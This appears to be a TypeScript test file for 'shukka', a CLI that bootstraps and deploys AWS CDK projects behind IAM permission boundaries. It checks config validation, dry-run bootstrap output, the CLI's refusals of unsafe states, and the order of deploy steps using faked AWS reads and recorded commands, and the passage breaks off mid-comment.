// The shukka CLI (shu-5ix): bootstrap --account, bootstrap <project>, diff, deploy, --help; and the fence object
// in shukka.json that bootstrap reads. AWS, GitHub and cdk are never called: AWS reads go through a fake `Aws`,
// commands through a recording spawn, and the bootstrap commands are checked in dry-run output.
/* eslint-disable @typescript-eslint/no-explicit-any -- SDK commands and fakes are loosely typed on purpose */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawn, spawnSync } from 'node:child_process';
import { cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { homedir, tmpdir } from 'node:os';
import { dirname, join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import { validateConfig } from '../scripts/config.mjs';
import { COMMANDS, helpText, main } from '../scripts/cli/main.mjs';
import { checkBundlePath } from '../scripts/cli/deploy.mjs';
import {
  CliError, HOST_CODE_WARNING, PROJECT_BASE_IMAGE, PROJECT_DOCKERFILE, PROJECT_PLATFORM, SERVICES, cdkBin, containerArgs, projectImage, quote, realSpawn,
} from '../scripts/cli/exec.mjs';
import { bundleDir, stubClient } from './helpers/release-fixtures.js';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const ACCOUNT = '123456789012';
const OWNER = `arn:aws:iam::${ACCOUNT}:user/personal-root-user`;
const ZONE = 'Z0123456789ABCDEFGHIJ';
const OIDC = `arn:aws:iam::${ACCOUNT}:oidc-provider/token.actions.githubusercontent.com`;

type Call = { cmd: string; args: string[]; options: any };
type Fake = Record<string, any>;

function configJson(mutate: (c: any) => void = () => {}) {
  const c: any = {
    project: 'shukkatest',
    qualifier: 'shukkatest',
    aws: { account: ACCOUNT, region: 'us-east-1' },
    checks: [{ name: 'unit', dir: 'app', run: ['npm test'] }],
    infra: { dir: 'infra', paths: ['infra/**'] },
    apps: [{
      name: 'web',
      paths: ['app/**'],
      build: { dir: 'app', run: ['npm ci', 'npm run build'], bundle: 'scripts/bundle.sh', env: { APP_URL: 'https://example.com' }, buildEnv: ['LEGAL_ENTITY', 'CONTACT_EMAIL'] },
      server: { configure: 'box/configure-web.sh', units: ['shukkatest-web'], health: 'http://127.0.0.1:3000/' },
    }],
    smoke: { run: 'bash smoke.sh' },
    fence: { hostedZoneIds: [ZONE], mailDomains: ['example.com'] },
  };
  mutate(c);
  return c;
}

function write(path: string, content: string) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, content);
}

function git(dir: string, ...args: string[]) {
  return execFileSync('git', ['-C', dir, ...args], { encoding: 'utf8', stdio: 'pipe' }).trim();
}

/** A consumer repository with shukka.json, pushed to a local bare origin: a clean clone at origin/main. */
function consumer(tmp: string, mutate?: (c: any) => void): { dir: string; sha: string } {
  const origin = join(tmp, 'origin.git');
  execFileSync('git', ['init', '-q', '--bare', '-b', 'main', origin]);
  const dir = join(tmp, 'consumer');
  mkdirSync(dir);
  git(dir, 'init', '-q', '-b', 'main');
  git(dir, 'config', 'user.email', 'test@example.com');
  git(dir, 'config', 'user.name', 'test');
  git(dir, 'config', 'commit.gpgsign', 'false');
  write(join(dir, 'shukka.json'), `${JSON.stringify(configJson(mutate), null, 2)}\n`);
  write(join(dir, 'app', 'package.json'), '{}\n');
  write(join(dir, 'infra', 'package.json'), '{}\n');
  write(join(dir, 'box', 'configure-web.sh'), '#!/usr/bin/env bash\necho configured\n');
  write(join(dir, 'smoke.sh'), 'exit 0\n');
  git(dir, 'add', '-A');
  git(dir, 'commit', '-q', '-m', 'consumer');
  git(dir, 'remote', 'add', 'origin', origin);
  git(dir, 'push', '-q', '-u', 'origin', 'main');
  return { dir, sha: git(dir, 'rev-parse', 'HEAD') };
}

function withTmp(fn: (tmp: string) => Promise<void> | void) {
  return async () => {
    const tmp = mkdtempSync(join(tmpdir(), 'shu-5ix-'));
    try {
      await fn(tmp);
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  };
}

const PARAMETERS: Record<string, { type: string; value: string }> = {
  '/shukkatest/prod/LEGAL_ENTITY': { type: 'String', value: 'Example Ltd' },
  '/shukkatest/prod/CONTACT_EMAIL': { type: 'String', value: 'hello@example.com' },
};

/** A fake of every AWS read the CLI makes; `over` replaces single reads. */
function fakeAws(over: Fake = {}) {
  const reads: string[] = [];
  const base: Fake = {
    callerArn: async () => ({ account: ACCOUNT, arn: OWNER }),
    roleArn: async (name: string) => `arn:aws:iam::${ACCOUNT}:role/admins/${name}`,
    describeStack: async () => null,
    stackResourceIds: async () => [],
    listStackNames: async () => [],
    getParameter: async (name: string) => PARAMETERS[name] ?? null,
    privateTypes: async () => [],
    unboundedRoles: async () => [],
    oidcProviders: async () => [],
    hostedZoneName: async (id: string) => (id === ZONE ? 'example.com.' : `zone-${id.toLowerCase()}.example.`),
    localPolicies: async () => [],
    policyDocument: async () => '{}',
    assumeRole: async () => ({ accessKeyId: 'ASIAFENCED', secretAccessKey: 'fenced-secret', sessionToken: 'fenced-token' }),
    clients: () => { throw new Error('no AWS clients in this test'); },
    accountResources: async () => [],
    stacksWithTags: async () => [],
    stackPhysicalIds: async () => [],
    ...over,
  };
  const aws: Fake = {};
  for (const [k, f] of Object.entries(base)) {
    aws[k] = (...args: any[]) => {
      reads.push(`${k}(${args.map((a) => JSON.stringify(a)).join(',')})`);
      return f(...args);
    };
  }
  return { aws, reads };
}

const DOCKER_VALUE_FLAGS = new Set(['--name', '--user', '--cap-drop', '--security-opt', '--mount', '--workdir', '--env', '--env-file', '--platform', '--network']);

/**
 * A `docker run [flags] <image> <cmd> <args>` command line taken apart: the command run inside, its workdir, the
 * container's whole environment (--env values and the --env-file's lines), the image, the mounts and the flags.
 */
function unwrapDocker(args: string[]) {
  const env: Record<string, string> = {};
  const mounts: string[] = [];
  const flags: string[] = [];
  let cwd = '';
  let i = 1;
  while (i < args.length && args[i]!.startsWith('-')) {
    const f = args[i]!;
    flags.push(f);
    if (!DOCKER_VALUE_FLAGS.has(f)) { i += 1; continue; }
    const v = args[i + 1]!;
    if (f === '--workdir') cwd = v;
    if (f === '--mount') mounts.push(v);
    if (f === '--env') { const eq = v.indexOf('='); env[v.slice(0, eq)] = v.slice(eq + 1); }
    if (f === '--env-file') {
      for (const line of readFileSync(v, 'utf8').split('\n').filter(Boolean)) { const eq = line.indexOf('='); env[line.slice(0, eq)] = line.slice(eq + 1); }
    }
    i += 2;
  }
  return { image: args[i]!, cmd: args[i + 1]!, args: args.slice(i + 2), cwd, env, mounts, flags };
}

/**
 * A recording spawn: git runs for real (on test repositories), everything else is answered by `respond`. A
 * `docker run` of a project step (not a detached service) is recorded (and answered) as the command run inside the container, with the
 * container's workdir as `cwd`, its whole environment as `fullEnv` and the real docker argv as `docker`.
 */
function recordingSpawn(respond: (call: Call) => { status: number; stdout: string } = () => ({ status: 0, stdout: '' })) {
  const calls: Call[] = [];
  const spawn = (cmd: string, args: string[], options: any) => {
    if (cmd === 'docker' && args[0] === 'run' && !args.includes('--detach')) {
      const u = unwrapDocker(args);
      const call = { cmd: u.cmd, args: u.args, options: { ...options, cwd: u.cwd, fullEnv: u.env, docker: args } };
      calls.push(call);
      return respond(call);
    }
    calls.push({ cmd, args, options });
    if (cmd === 'git') return realSpawn(cmd, args, { ...options, capture: options.capture || 'stdout' });
    return respond({ cmd, args, options });
  };
  return { calls, spawn };
}

/** The real spawn, except docker: `docker info` and `docker image inspect` answer (Docker and the image are there), anything else fails the test. */
function stubDockerSpawn(cmd: string, args: string[], options: any) {
  if (cmd === 'docker') {
    if (args[0] === 'info' || (args[0] === 'image' && args[1] === 'inspect')) return { status: 0, stdout: '' };
    throw new Error(`this test may not run ${cmd} ${args.join(' ')}`);
  }
  return realSpawn(cmd, args, options);
}

async function cli(argv: string[], opts: { aws?: Fake; spawn?: any; cwd?: string; env?: Record<string, string>; checkAssembly?: (dir: string) => string[]; keepTemp?: boolean } = {}) {
  let out = '';
  let err = '';
  const code = await main(argv, {
    out: (t: string) => { out += t; },
    err: (t: string) => { err += t; },
    // Docker is never called for real: without a recording spawn, `docker info` answers and nothing else may run.
    spawn: opts.spawn ?? stubDockerSpawn,
    aws: () => (opts.aws ?? fakeAws().aws) as any,
    cwd: opts.cwd ?? root,
    env: opts.env ?? {},
    keepTemp: opts.keepTemp ?? true,
    ...(opts.checkAssembly ? { checkAssembly: opts.checkAssembly } : {}),
  });
  return { code, out, err };
}

/** The commands printed with `+ `, in order, without the `(in <dir>) ` prefix. */
function printed(out: string): string[] {
  return out.split('\n').filter((l) => l.startsWith('+ ')).map((l) => l.replace(/^\+ \(in \S+\) /, '+ '));
}

const CDK = [process.execPath, cdkBin()].map(quote).join(' ');
const reEscape = (t: string) => t.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&');

/** The value after `flag` in a printed command line. */
function argAfter(line: string, flag: string): string {
  const words = line.split(/\s+/);
  const i = words.indexOf(flag);
  assert.ok(i !== -1, `${flag} in ${line}`);
  return words[i + 1] as string;
}

function templateOf(assembly: string, stack: string): any {
  return JSON.parse(readFileSync(join(assembly, `${stack}.template.json`), 'utf8'));
}

const MUTATING = (calls: Call[]) => calls.filter((c) => c.cmd !== 'git' && !(c.cmd === 'aws' && c.args[0] === 'sts') && !(c.cmd === 'docker' && (c.args[0] === 'info' || (c.args[0] === 'image' && c.args[1] === 'inspect'))));

// ---------- shukka.json fence object ----------

test('shu-5ix: shukka.json takes an optional fence object with hosted zone ids and mail domains', () => {
  const ok = validateConfig(configJson());
  assert.deepEqual(ok.problems, []);
  assert.deepEqual(ok.config!.fence, { hostedZoneIds: [ZONE], mailDomains: ['example.com'] });

  const none = validateConfig(configJson((c) => { delete c.fence; }));
  assert.deepEqual(none.problems, []);
  assert.deepEqual(none.config!.fence, { hostedZoneIds: [], mailDomains: [] });

  const cases: [(c: any) => void, RegExp][] = [
    [(c) => { c.fence.hostedZoneIds = ['zone1']; }, /^shukka\.json: fence\.hostedZoneIds\[0\]: /],
    [(c) => { c.fence.mailDomains = ['*.example.com']; }, /^shukka\.json: fence\.mailDomains\[0\]: /],
    [(c) => { c.fence.zones = []; }, /^shukka\.json: fence\.zones: unknown key/],
    [(c) => { c.fence = ['Z1']; }, /^shukka\.json: fence: expected object/],
  ];
  for (const [mutate, expected] of cases) {
    const { config, problems } = validateConfig(configJson(mutate));
    assert.equal(config, null);
    assert.ok(problems.some((p: string) => expected.test(p)), `${expected} in ${problems.join(' | ')}`);
  }
});

// ---------- bootstrap --account ----------

test('shu-5ix: bootstrap --account dry run prints the cdk deploy of Shukka-Account with the caller profile and changes nothing', withTmp(async () => {
  const { calls, spawn } = recordingSpawn();
  const r = await cli(['bootstrap', '--account', '--profile', 'stelking', '--region', 'us-east-1', '--dry-run'], { spawn });
  assert.equal(r.code, 0, r.err);
  const lines = printed(r.out);
  const deploy = lines.find((l) => l.includes(' deploy Shukka-Account'));
  assert.ok(deploy, r.out);
  assert.match(deploy, new RegExp(`^\\+ ${reEscape(CDK)} deploy Shukka-Account --app \\S+ --require-approval never --no-color --profile stelking\\s+\\[dry run: not run\\]$`));
  assert.deepEqual(MUTATING(calls), [], 'nothing but lookups ran');
  const template = templateOf(argAfter(deploy, '--app'), 'Shukka-Account');
  const types = Object.values(template.Resources).map((x: any) => x.Type);
  assert.ok(types.includes('AWS::IAM::OIDCProvider'), 'a new account creates the provider');
  assert.equal(template.Outputs.Projects.Value, 'none');
  assert.equal(template.Parameters?.BootstrapVersion, undefined, 'needs no CDK bootstrap of its own');
}));

test('shu-5ix: bootstrap --account imports an existing OIDC provider with --oidc-provider-arn and never creates one', async () => {
  const r = await cli(['bootstrap', '--account', '--oidc-provider-arn', OIDC, '--region', 'us-east-1', '--dry-run'], {
    aws: fakeAws({ oidcProviders: async () => [OIDC] }).aws,
  });
  assert.equal(r.code, 0, r.err);
  const deploy = printed(r.out).find((l) => l.includes(' deploy Shukka-Account'))!;
  const template = templateOf(argAfter(deploy, '--app'), 'Shukka-Account');
  assert.ok(!Object.values(template.Resources).some((x: any) => x.Type === 'AWS::IAM::OIDCProvider'));
  assert.equal(template.Outputs.OidcProviderArn.Value, OIDC);
});

test('shu-5ix: bootstrap --account refuses to create a second GitHub provider, and a provider ARN from another account', async () => {
  const exists = await cli(['bootstrap', '--account', '--region', 'us-east-1', '--dry-run'], { aws: fakeAws({ oidcProviders: async () => [OIDC] }).aws });
  assert.equal(exists.code, 1);
  assert.match(exists.err, /already has a GitHub OIDC provider .*--oidc-provider-arn/);
  assert.deepEqual(printed(exists.out), [], 'no command was printed, so none ran');

  const other = await cli(['bootstrap', '--account', '--oidc-provider-arn', OIDC.replace(ACCOUNT, '999999999999'), '--region', 'us-east-1', '--dry-run']);
  assert.equal(other.code, 1);
  assert.match(other.err, /in account 999999999999/);
});

test('shu-5ix: bootstrap --account keeps the deployed project list and the imported provider', async () => {
  const account = { name: 'Shukka-Account', outputs: { Projects: 'trendigle,orbitary', OidcProviderArn: OIDC }, tags: {} };
  const r = await cli(['bootstrap', '--account', '--region', 'us-east-1', '--dry-run'], {
    aws: fakeAws({ describeStack: async (n: string) => (n === 'Shukka-Account' ? account : null), stackResourceIds: async () => ['Placeholder'] }).aws,
  });
  assert.equal(r.code, 0, r.err);
  const template = templateOf(argAfter(printed(r.out).find((l) => l.includes('deploy Shukka-Account'))!, '--app'), 'Shukka-Account');
  assert.equal(template.Outputs.Projects.Value, 'trendigle,orbitary');
  assert.equal(template.Outputs.OidcProviderArn.Value, OIDC);

  const clash = await cli(['bootstrap', '--account', '--projects', 'trendigle,trendigle2', '--region', 'us-east-1', '--dry-run']);
  assert.equal(clash.code, 1);
  assert.match(clash.err, /prefix/);
});

// ---------- bootstrap <project> ----------

function projectArgs(extra: string[] = []) {
  return ['bootstrap', 'shukkatest', '--config', 'shukka.json', '--repo', 'owner/consumer', '--profile', 'stelking', '--region', 'us-east-1', '--dry-run', ...extra];
}

test('shu-5ix: bootstrap <project> dry run deploys the boundary stack, then the project bootstrap, then copies buildEnv to GitHub', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const { calls, spawn } = recordingSpawn();
  const { aws } = fakeAws();
  const r = await cli(projectArgs(), { spawn, aws, cwd: dir });
  assert.equal(r.code, 0, r.err);
  const lines = printed(r.out);
  const boundary = lines.findIndex((l) => l.includes('deploy Shukka-Boundary-shukkatest'));
  const toolkit = lines.findIndex((l) => l.startsWith('+ aws cloudformation deploy'));
  const vars = lines.map((l, i) => (l.startsWith('+ gh variable set') ? i : -1)).filter((i) => i !== -1);
  assert.ok(boundary !== -1 && toolkit > boundary && vars.length === 2 && vars[0]! > toolkit, r.out);

  // 1. The fence: boundary and the three execution policies, with the config's hosted zone and mail domain.
  const boundaryLine = lines[boundary]!;
  assert.match(boundaryLine, /--profile stelking/);
  const fence = templateOf(argAfter(boundaryLine, '--app'), 'Shukka-Boundary-shukkatest');
  const names = Object.values(fence.Resources).filter((x: any) => x.Type === 'AWS::IAM::ManagedPolicy').map((x: any) => x.Properties.ManagedPolicyName).sort();
  assert.deepEqual(names, ['shukkatest-shukka-boundary', 'shukkatest-shukka-execution', 'shukkatest-shukka-execution-iam', 'shukkatest-shukka-execution-infra']);
  assert.match(JSON.stringify(fence), new RegExp(`hostedzone/${ZONE}`));
  assert.match(JSON.stringify(fence), /identity\/example\.com/);

  // 2. The bootstrap: CDKToolkit-<qualifier>, never the default CDKToolkit; all three execution policies; the caller as emergency principal.
  const toolkitLine = lines[toolkit]!;
  assert.equal(argAfter(toolkitLine, '--stack-name'), 'CDKToolkit-shukkatest');
  assert.ok(!/--stack-name CDKToolkit(\s|$)/.test(r.out));
  for (const flag of ['--capabilities CAPABILITY_NAMED_IAM', '--tags shukka:project=shukkatest', '--region us-east-1', '--profile stelking']) {
    assert.ok(toolkitLine.includes(flag), `${flag} in ${toolkitLine}`);
  }
  const template = JSON.parse(readFileSync(argAfter(toolkitLine, '--template-file'), 'utf8'));
  const exec = template.Resources.CloudFormationExecutionRole.Properties.ManagedPolicyArns.map((a: any) => a['Fn::Sub']);
  assert.deepEqual(exec.map((a: string) => a.split('policy/')[1]), ['shukkatest-shukka-execution', 'shukkatest-shukka-execution-infra', 'shukkatest-shukka-execution-iam']);
  assert.equal(template.Resources.CdkBootstrapVersion.Properties.Name, '/cdk-bootstrap/shukkatest/version');
  const trust = template.Resources.DeploymentActionRole.Properties.AssumeRolePolicyDocument.Statement[0].Condition.ArnLike['aws:PrincipalArn'];
  assert.ok(trust.includes(OWNER), 'the caller may deploy from a laptop');

  // 3. buildEnv values from Parameter Store to repository variables, never printed.
  assert.deepEqual(lines.filter((l) => l.startsWith('+ gh')).map((l) => l.replace(/\s+\[dry run: not run\]$/, '')), [
    '+ gh variable set LEGAL_ENTITY --repo owner/consumer < value of /shukkatest/prod/LEGAL_ENTITY',
    '+ gh variable set CONTACT_EMAIL --repo owner/consumer < value of /shukkatest/prod/CONTACT_EMAIL',
  ]);
  assert.ok(!r.out.includes('Example Ltd') && !r.err.includes('hello@example.com'));

  assert.deepEqual(MUTATING(calls), [], 'a dry run changes nothing');
  assert.match(r.err, /Shukka-Account does not exist/);
}));

test('shu-5ix: bootstrap <project> real run hands each buildEnv value to gh on stdin', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const { calls, spawn } = recordingSpawn();
  const r = await cli(projectArgs().filter((a) => a !== '--dry-run'), { spawn, cwd: dir });
  assert.equal(r.code, 0, r.err);
  const gh = calls.filter((c) => c.cmd === 'gh');
  assert.deepEqual(gh.map((c) => [c.args, c.options.input]), [
    [['variable', 'set', 'LEGAL_ENTITY', '--repo', 'owner/consumer'], 'Example Ltd'],
    [['variable', 'set', 'CONTACT_EMAIL', '--repo', 'owner/consumer'], 'hello@example.com'],
  ]);
  assert.deepEqual(calls.filter((c) => c.cmd !== 'git' && c.cmd !== 'gh').map((c) => `${c.cmd} ${c.args.slice(0, 3).join(' ')}`), [
    `${process.execPath} ${cdkBin()} deploy Shukka-Boundary-shukkatest`,
    'aws cloudformation deploy --stack-name',
  ]);
  const toolkit = calls.find((c) => c.cmd === 'aws' && c.args[1] === 'deploy')!;
  assert.equal(toolkit.args[toolkit.args.indexOf('--stack-name') + 1], 'CDKToolkit-shukkatest');
}));

test('shu-5ix: bootstrap <project> takes the hosted zone and mail domain from flags over shukka.json', withTmp(async (tmp) => {
  const { dir } = consumer(tmp, (c) => { delete c.fence; });
  const none = await cli(projectArgs(), { cwd: dir });
  assert.equal(none.code, 1);
  assert.match(none.err, /exactly one hosted zone/);

  const r = await cli(projectArgs(['--hosted-zone-id', 'ZFLAG123', '--mail-domain', 'mail.example.org']), { cwd: dir });
  assert.equal(r.code, 0, r.err);
  const fence = JSON.stringify(templateOf(argAfter(printed(r.out).find((l) => l.includes('Shukka-Boundary'))!, '--app'), 'Shukka-Boundary-shukkatest'));
  assert.match(fence, /hostedzone\/ZFLAG123/);
  assert.match(fence, /identity\/mail\.example\.org/);
}));

test('shu-5ix: emergency principals default to the caller (an assumed role resolves to its role ARN) and --emergency-principal overrides', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const trustOf = (out: string) => {
    const file = argAfter(printed(out).find((l) => l.startsWith('+ aws cloudformation deploy'))!, '--template-file');
    return JSON.parse(readFileSync(file, 'utf8')).Resources.DeploymentActionRole.Properties.AssumeRolePolicyDocument.Statement[0].Condition.ArnLike['aws:PrincipalArn'];
  };
  const assumed = fakeAws({ callerArn: async () => ({ account: ACCOUNT, arn: `arn:aws:sts::${ACCOUNT}:assumed-role/Admin/rehan` }) });
  const a = await cli(projectArgs(), { cwd: dir, aws: assumed.aws });
  assert.equal(a.code, 0, a.err);
  assert.ok(trustOf(a.out).includes(`arn:aws:iam::${ACCOUNT}:role/admins/Admin`));

  const other = `arn:aws:iam::${ACCOUNT}:role/break-glass`;
  const o = await cli(projectArgs(['--emergency-principal', other]), { cwd: dir });
  assert.equal(o.code, 0, o.err);
  assert.ok(trustOf(o.out).includes(other));
  assert.ok(!trustOf(o.out).includes(OWNER));

  const rootCaller = fakeAws({ callerArn: async () => ({ account: ACCOUNT, arn: `arn:aws:iam::${ACCOUNT}:root` }) });
  const rt = await cli(projectArgs(), { cwd: dir, aws: rootCaller.aws });
  assert.equal(rt.code, 1);
  assert.match(rt.err, /--emergency-principal/);
}));

test('shu-5ix: bootstrap <project> adds the project to Shukka-Account when it exists', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const account = { name: 'Shukka-Account', outputs: { Projects: 'trendigle', OidcProviderArn: OIDC }, tags: {} };
  const r = await cli(projectArgs(), {
    cwd: dir,
    aws: fakeAws({ describeStack: async (n: string) => (n === 'Shukka-Account' ? account : null), stackResourceIds: async () => ['Placeholder'] }).aws,
  });
  assert.equal(r.code, 0, r.err);
  const line = printed(r.out).find((l) => l.includes('deploy Shukka-Account'));
  assert.ok(line, r.out);
  const template = templateOf(argAfter(line, '--app'), 'Shukka-Account');
  assert.equal(template.Outputs.Projects.Value, 'trendigle,shukkatest');
  assert.equal(template.Outputs.OidcProviderArn.Value, OIDC);
}));

test('shu-5ix: bootstrap <project> refuses before changing anything', withTmp(async (tmp) => {
  const cases: { name: string; mutate?: (c: any) => void; aws?: Fake; args?: string[]; expect: RegExp }[] = [
    { name: 'a known project prefixed by this one', aws: { listStackNames: async () => ['Shukka-Boundary-shukkatestx'] }, expect: /"shukkatest" is a prefix of known project "shukkatestx"/ },
    { name: 'a known project prefixing this one', aws: { describeStack: async (n: string) => (n === 'Shukka-Account' ? { name: n, outputs: { Projects: 'shukkate' }, tags: {} } : null) }, expect: /known project "shukkate" is a prefix of "shukkatest"/ },
    { name: "CDK's default qualifier", mutate: (c) => { c.qualifier = 'hnb659fds'; }, expect: /hnb659fds is CDK's default bootstrap/ },
    { name: 'a qualifier bootstrapped by something else', aws: { getParameter: async (n: string) => (n === '/cdk-bootstrap/shukkatest/version' ? { type: 'String', value: '21' } : PARAMETERS[n] ?? null) }, expect: /qualifier shukkatest is already bootstrapped/ },
    { name: 'a toolkit stack shukka did not make', aws: { describeStack: async (n: string) => (n === 'CDKToolkit-shukkatest' ? { name: n, outputs: {}, tags: {} } : null) }, expect: /CDKToolkit-shukkatest exists and was not made by shukka/ },
    { name: 'a private CloudFormation type', aws: { privateTypes: async () => [{ kind: 'RESOURCE', typeName: 'Acme::Admin::Thing', executionRoleArn: `arn:aws:iam::${ACCOUNT}:role/acme-admin` }] }, expect: /Acme::Admin::Thing runs as arn:aws:iam::123456789012:role\/acme-admin[\s\S]*--allow-private-types/ },
    { name: 'a role in the prefix without the boundary', aws: { unboundedRoles: async () => [{ roleName: 'shukkatest-old', arn: `arn:aws:iam::${ACCOUNT}:role/shukkatest-old` }] }, expect: /role arn:aws:iam::123456789012:role\/shukkatest-old matches the shukkatest prefix but has no permissions boundary/ },
    { name: 'a buildEnv parameter that does not exist', aws: { getParameter: async () => null }, expect: /buildEnv LEGAL_ENTITY: parameter \/shukkatest\/prod\/LEGAL_ENTITY does not exist/ },
    { name: 'a secret buildEnv parameter', aws: { getParameter: async (n: string) => (n.startsWith('/shukkatest/prod/') ? { type: 'SecureString', value: 'x' } : null) }, expect: /SecureString/ },
    { name: 'credentials for another account', aws: { callerArn: async () => ({ account: '999999999999', arn: 'arn:aws:iam::999999999999:user/x' }) }, expect: /account 999999999999/ },
    { name: 'a project argument that is not the config', args: ['bootstrap', 'other', '--repo', 'owner/consumer', '--dry-run'], expect: /project "other" is not the project/ },
    { name: 'a bad emergency principal', args: [...projectArgs().filter((a) => a !== '--dry-run'), '--emergency-principal', '*'], expect: /emergency principal "\*" must be an IAM role or user ARN/ },
    { name: 'a region that is not the config', args: ['bootstrap', 'shukkatest', '--region', 'eu-west-1', '--repo', 'owner/consumer'], expect: /--region eu-west-1 is not the region/ },
  ];
  for (const [i, c] of cases.entries()) {
    const sub = join(tmp, String(i));
    mkdirSync(sub);
    const { dir } = consumer(sub, c.mutate);
    const { calls, spawn } = recordingSpawn();
    const r = await cli(c.args ?? projectArgs().filter((a) => a !== '--dry-run'), { cwd: dir, spawn, aws: fakeAws(c.aws).aws });
    assert.equal(r.code, 1, `${c.name}: ${r.out}${r.err}`);
    assert.match(r.err, c.expect, c.name);
    assert.deepEqual(MUTATING(calls), [], `${c.name}: nothing ran`);
  }
}));

test('shu-5ix: --allow-private-types reports each private type with its execution role and goes ahead', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const r = await cli(projectArgs(['--allow-private-types']), {
    cwd: dir, aws: fakeAws({ privateTypes: async () => [{ kind: 'MODULE', typeName: 'Acme::Net::Vpc::MODULE', executionRoleArn: null }] }).aws,
  });
  assert.equal(r.code, 0, r.err);
  assert.match(r.err, /warning: private CloudFormation module Acme::Net::Vpc::MODULE runs as no execution role/);
}));

test('shu-5ix: project names that are prefixes of reserved names are refused (access-8)', withTmp(async (tmp) => {
  const { dir } = consumer(tmp, (c) => { c.project = 'aw'; c.qualifier = 'aw'; });
  const r = await cli(['bootstrap', 'aw', '--repo', 'owner/consumer', '--dry-run'], { cwd: dir });
  assert.equal(r.code, 1);
  assert.match(r.err, /project name "aw" is reserved \(aws\)/);
}));

// ---------- diff and deploy: refusals ----------

test('shu-5ix: diff and deploy refuse a dirty working tree, an untracked file, and a HEAD that is not origin/main', withTmp(async (tmp) => {
  for (const command of ['diff', 'deploy']) {
    const sub = join(tmp, command);
    mkdirSync(sub);
    const { dir } = consumer(sub);

    write(join(dir, 'app', 'package.json'), '{"changed":true}\n');
    let s = recordingSpawn();
    let r = await cli([command, '--profile', 'stelking'], { cwd: dir, spawn: s.spawn });
    assert.equal(r.code, 1, r.out + r.err);
    assert.match(r.err, /refusing: the working tree is not clean/);
    assert.deepEqual(MUTATING(s.calls), [], `${command}: nothing ran on a dirty tree`);
    git(dir, 'checkout', '--', 'app/package.json');

    write(join(dir, 'notes.txt'), 'scratch\n');
    s = recordingSpawn();
    r = await cli([command], { cwd: dir, spawn: s.spawn });
    assert.equal(r.code, 1);
    assert.match(r.err, /not clean .*notes\.txt/);
    rmSync(join(dir, 'notes.txt'));

    write(join(dir, 'smoke.sh'), 'exit 1\n');
    git(dir, 'commit', '-q', '-am', 'local only');
    s = recordingSpawn();
    r = await cli([command], { cwd: dir, spawn: s.spawn });
    assert.equal(r.code, 1);
    assert.match(r.err, /refusing: HEAD \([0-9a-f]{12}\) is not origin\/main/);
    assert.deepEqual(MUTATING(s.calls), [], `${command}: nothing ran ahead of origin/main`);

    git(dir, 'remote', 'remove', 'origin');
    s = recordingSpawn();
    r = await cli([command], { cwd: dir, spawn: s.spawn });
    assert.equal(r.code, 1);
    assert.match(r.err, /no origin\/main/);
  }
}));

// ---------- deploy and diff: the workflow steps ----------

const CLEAN_DIFF = 'Stack shukkatest-App\nThere were no differences\n\n✨  Number of stacks with differences: 0\n';
const DESTRUCTIVE_DIFF = 'Stack shukkatest-App\nResources\n[-] AWS::EC2::Instance Box Box1234 destroy\n\n✨  Number of stacks with differences: 1\n';
const isCdk = (c: Call, verb: string) => c.cmd === process.execPath && c.args[0] === cdkBin() && c.args[1] === verb;
const NO_ASSETS = () => [] as string[];

test('shu-5ix: deploy dry run prints the workflow steps in order: checks, build, synth, assembly check, fenced session, diff, guard, cdk deploy with the revision, upload, release, smoke', withTmp(async (tmp) => {
  const { dir, sha } = consumer(tmp);
  const { calls, spawn } = recordingSpawn();
  const r = await cli(['deploy', '--profile', 'stelking', '--dry-run'], { cwd: dir, spawn, aws: fakeAws().aws });
  assert.equal(r.code, 0, r.err);
  const lines = printed(r.out).filter((l) => !/^\+ git /.test(l)).map((l) => l.replace(/^\+ /, '').replace(/\s+\[dry run: not run\]$/, ''));
  // Project code runs in containers (shu-9bj.8): each step is a docker run of the pinned image.
  const box = `docker run --rm --platform linux/amd64 .* ${reEscape(projectImage())} `;
  const order = [
    /^docker info --format '\{\{\.ServerVersion\}\}'$/,
    new RegExp(`^docker image inspect --format '\\{\\{\\.Id\\}\\}' ${reEscape(projectImage())}$`),
    new RegExp(`^${box}bash -eo pipefail -c 'npm test'$`),
    new RegExp(`^${box}bash -eo pipefail -c 'npm ci'$`),
    new RegExp(`^${box}bash -eo pipefail -c 'npm run build'$`),
    new RegExp(`^${box}bash \\S+/shukka-tree-\\S+/\\.shukka-bundle-\\S+/bundle\\.sh$`), // shukka's script, copied into the tree
    new RegExp(`^${box}npm ci$`),
    new RegExp(`^${box}npx --no-install cdk synth --quiet --output \\S+$`),
    /^node scripts\/assembly\.mjs check \S+$/,
    new RegExp(`^node scripts/policy-guard\\.mjs \\S+ --account ${ACCOUNT} --mail-domain example\\.com$`),
    new RegExp(`^assume arn:aws:iam::${ACCOUNT}:role/cdk-shukkatest-deploy-role-${ACCOUNT}-us-east-1 as shukka-emergency; cdk gets only that session$`),
    new RegExp(`^${reEscape(CDK)} diff --app \\S+ --no-color$`),
    /^node scripts\/guard\.mjs < the diff$/,
    new RegExp(`^${reEscape(CDK)} deploy --app \\S+ --require-approval never --no-color --all --tags=shukka:revision=${sha}$`),
    new RegExp(`^upload .* to s3://shukkatest-deploy-${ACCOUNT}/shukkatest/web/${sha}\\.tgz \\(scripts/upload\\.mjs\\)$`),
    new RegExp(`^release shukkatest/web ${sha} on instances tagged Project=shukkatest \\(scripts/release\\.mjs\\)$`),
    new RegExp(`^${box}bash -c 'bash smoke\\.sh'$`),
  ];
  assert.equal(lines.length, order.length, lines.join('\n'));
  order.forEach((re, i) => assert.match(lines[i]!, re));
  assert.match(r.out, /the real cdk deploy commands depend on the synthesized assembly/);
  assert.deepEqual(MUTATING(calls), [], 'a dry run changes nothing');
}));

/**
 * What a bundle script run in the container does: copy `bundle` (when given) to .next/shukka-bundle in its working
